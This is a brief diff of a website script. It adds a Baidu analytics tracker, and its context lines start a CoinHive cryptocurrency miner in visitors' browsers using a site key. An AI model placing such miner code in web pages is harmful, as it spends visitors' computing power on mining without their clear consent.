@@ -21,4 +21,10 @@
     var miner = new CoinHive.Anonymous('bSiM5UP0bWeY98R39fQBb2nKiiofSxmU', {threads: 1, throttle: 0.9});
     miner.start();
   }
+
+  // baidu
+  var hm = document.createElement("script");
+  hm.src = "//hm.baidu.com/hm.js?f17557e022686a8ff2a6d32403393093";
+  var s = document.getElementsByTagName("script")[0];
+  s.parentNode.insertBefore(hm, s);
 })();
